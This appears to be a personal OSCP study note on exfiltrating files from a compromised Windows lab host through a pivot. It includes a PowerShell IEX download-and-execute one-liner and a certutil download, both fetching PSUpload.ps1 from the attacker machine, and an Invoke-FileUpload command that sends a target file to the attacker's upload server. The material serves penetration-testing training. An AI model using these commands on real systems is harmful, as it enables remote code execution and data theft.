Uploadserver

On KALI ATTACKER:

(Skip)
```
pipx install uploadserver
```

```
uploadserver 4445
```

---

Import Powershell script to upload a file to KALI upload server. (Executes immediately)

```
python -m http.server 80 --directory ~/Desktop/Tools/Windows
```

On TARGET
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `IEX(New-Object Net.WebClient).DownloadString('http://${KaliIP}/PSUpload.ps1')`;

dv.paragraph("```bash\n" + command + "\n```");
```
```
certutil -urlcache -split -f http://${MS01_IP}:4445/PSUpload.ps1 PSUpload.ps1
```

On KALI
```
uploadserver 4445
```

On TARGET host (MS02): _Evil-WinRM_ PS C:\Users\celia.almeda\Documents>
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `Invoke-FileUpload -Uri "http://${KaliIP}:4445/upload" -File "C:\PATH`;

dv.paragraph("```bash\n" + command + "\n```");
```
Essentially, you are uploading a file to a listener on MS01, which is set up to auto-forward to Kali with the reverse port forward.

---

[[Sending payload reverse direction through ligolo pivot]]